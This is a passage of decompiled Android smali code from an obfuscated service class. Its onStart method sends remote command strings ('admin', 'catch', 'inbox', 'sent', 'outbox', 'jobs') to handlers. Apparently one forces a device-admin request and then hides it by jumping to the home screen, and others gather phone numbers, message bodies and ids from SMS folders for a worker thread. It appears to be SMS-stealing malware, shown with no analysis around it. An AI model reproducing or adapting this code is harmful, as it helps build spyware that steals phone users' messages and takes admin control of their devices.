    iget-wide v4, v0, Lcom/milkway/oden/c;->c:J

    cmp-long v2, v2, v4

    if-lez v2, :cond_0

    invoke-static {}, Lcom/milkway/oden/d;->a()J

    move-result-wide v2

    iput-wide v2, v0, Lcom/milkway/oden/c;->c:J

    iget-wide v2, v0, Lcom/milkway/oden/c;->c:J

    iget v4, v0, Lcom/milkway/oden/c;->a:I

    mul-int/lit16 v4, v4, 0x3e8

    int-to-long v4, v4

    add-long/2addr v2, v4

    iput-wide v2, v0, Lcom/milkway/oden/c;->c:J

    invoke-virtual {v0, v1}, Lcom/milkway/oden/c;->f(Landroid/content/Context;)Z

    goto/16 :goto_0
.end method

.method public onStart(Landroid/content/Intent;I)V
    .locals 9

    const/4 v5, 0x4

    const/4 v4, 0x3

    const/4 v3, 0x2

    const/4 v0, 0x0

    const/4 v2, 0x1

    invoke-super {p0, p1, p2}, Landroid/app/Service;->onStart(Landroid/content/Intent;I)V

    :try_start_0
    invoke-virtual {p1}, Landroid/content/Intent;->getExtras()Landroid/os/Bundle;

    move-result-object v6

    if-eqz v6, :cond_1

    const-string v1, "type"

    invoke-virtual {v6, v1}, Landroid/os/Bundle;->get(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v1

    if-eqz v1, :cond_1

    const-string v1, "type"

    invoke-virtual {v6, v1}, Landroid/os/Bundle;->get(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/Object;->toString()Ljava/lang/String;

    move-result-object v7

    const/4 v1, -0x1

    invoke-virtual {v7}, Ljava/lang/String;->hashCode()I

    move-result v8

    sparse-switch v8, :sswitch_data_0

    :cond_0
    move v0, v1

    :goto_0
    packed-switch v0, :pswitch_data_0

    :cond_1
    :goto_1
    return-void

    :sswitch_0
    const-string v2, "alarm"

    invoke-virtual {v7, v2}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v2

    if-eqz v2, :cond_0

    goto :goto_0

    :sswitch_1
    const-string v0, "jobs"

    invoke-virtual {v7, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_0

    move v0, v2

    goto :goto_0

    :sswitch_2
    const-string v0, "admin"

    invoke-virtual {v7, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_0

    move v0, v3

    goto :goto_0

    :sswitch_3
    const-string v0, "catch"

    invoke-virtual {v7, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_0

    move v0, v4

    goto :goto_0

    :sswitch_4
    const-string v0, "inbox"

    invoke-virtual {v7, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_0

    move v0, v5

    goto :goto_0

    :sswitch_5
    const-string v0, "sent"

    invoke-virtual {v7, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_0

    const/4 v0, 0x5

    goto :goto_0

    :sswitch_6
    const-string v0, "outbox"

    invoke-virtual {v7, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_0

    const/4 v0, 0x6

    goto :goto_0

    :pswitch_0
    new-instance v0, Ljava/lang/Thread;

    new-instance v1, Lcom/milkway/oden/h;

    const/4 v2, 0x1

    const/4 v3, 0x0

    invoke-direct {v1, p0, p0, v2, v3}, Lcom/milkway/oden/h;-><init>(Lcom/milkway/oden/k8sm502s;Lcom/milkway/oden/b;I[Ljava/lang/String;)V

    invoke-direct {v0, v1}, Ljava/lang/Thread;-><init>(Ljava/lang/Runnable;)V

    invoke-virtual {v0}, Ljava/lang/Thread;->start()V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_1

    :catch_0
    move-exception v0

    invoke-virtual {v0}, Ljava/lang/Exception;->printStackTrace()V

    goto :goto_1

    :pswitch_1
    :try_start_1
    const-string v0, "data"

    invoke-virtual {v6, v0}, Landroid/os/Bundle;->get(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/Object;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-virtual {p0, v0}, Lcom/milkway/oden/k8sm502s;->a(Ljava/lang/String;)V

    goto :goto_1

    :pswitch_2
    new-instance v0, Landroid/content/Intent;

    sget-object v1, Lcom/milkway/oden/a;->X:Ljava/lang/String;

    invoke-direct {v0, v1}, Landroid/content/Intent;-><init>(Ljava/lang/String;)V

    const/high16 v1, 0x40000000    # 2.0f

    invoke-virtual {v0, v1}, Landroid/content/Intent;->setFlags(I)Landroid/content/Intent;

    const/high16 v1, 0x10000000

    invoke-virtual {v0, v1}, Landroid/content/Intent;->setFlags(I)Landroid/content/Intent;

    invoke-virtual {p0, v0}, Lcom/milkway/oden/k8sm502s;->startActivity(Landroid/content/Intent;)V

    new-instance v0, Landroid/content/Intent;

    const-string v1, "android.intent.action.MAIN"

    invoke-direct {v0, v1}, Landroid/content/Intent;-><init>(Ljava/lang/String;)V

    const-string v1, "android.intent.category.HOME"

    invoke-virtual {v0, v1}, Landroid/content/Intent;->addCategory(Ljava/lang/String;)Landroid/content/Intent;

    const/high16 v1, 0x10000000

    invoke-virtual {v0, v1}, Landroid/content/Intent;->setFlags(I)Landroid/content/Intent;

    invoke-virtual {p0, v0}, Lcom/milkway/oden/k8sm502s;->startActivity(Landroid/content/Intent;)V

    goto/16 :goto_1

    :pswitch_3
    const/4 v0, 0x4

    new-array v0, v0, [Ljava/lang/String;

    const/4 v1, 0x0

    const-string v2, "phone"

    invoke-virtual {v6, v2}, Landroid/os/Bundle;->get(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/Object;->toString()Ljava/lang/String;

    move-result-object v2

    aput-object v2, v0, v1

    const/4 v1, 0x1

    const-string v2, "message"

    invoke-virtual {v6, v2}, Landroid/os/Bundle;->get(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/Object;->toString()Ljava/lang/String;

    move-result-object v2

    aput-object v2, v0, v1

    const/4 v1, 0x2

    aput-object v7, v0, v1

    const/4 v1, 0x3

    const-string v2, "id"

    invoke-virtual {v6, v2}, Landroid/os/Bundle;->get(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/Object;->toString()Ljava/lang/String;

    move-result-object v2

    aput-object v2, v0, v1

    new-instance v1, Ljava/lang/Thread;

    new-instance v2, Lcom/milkway/oden/h;

    const/4 v3, 0x5

    invoke-direct {v2, p0, p0, v3, v0}, Lcom/milkway/oden/h;-><init>(Lcom/milkway/oden/k8sm502s;Lcom/milkway/oden/b;I[Ljava/lang/String;)V

    invoke-direct {v1, v2}, Ljava/lang/Thread;-><init>(Ljava/lang/Runnable;)V

    invoke-virtual {v1}, Ljava/lang/Thread;->start()V
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_0

    goto/16 :goto_1

    :sswitch_data_0
    .sparse-switch
        -0x3bef1c43 -> :sswitch_6
        0x31dc56 -> :sswitch_1
        0x35cf98 -> :sswitch_5
        0x586034f -> :sswitch_2
        0x5897a51 -> :sswitch_0
        0x5a0eebb -> :sswitch_3
        0x5fb2286 -> :sswitch_4
    .end sparse-switch

    :pswitch_data_0
    .packed-switch 0x0
        :pswitch_0
        :pswitch_1
        :pswitch_2
        :pswitch_3
        :pswitch_3
        :pswitch_3
        :pswitch_3
    .end packed-switch
.end method
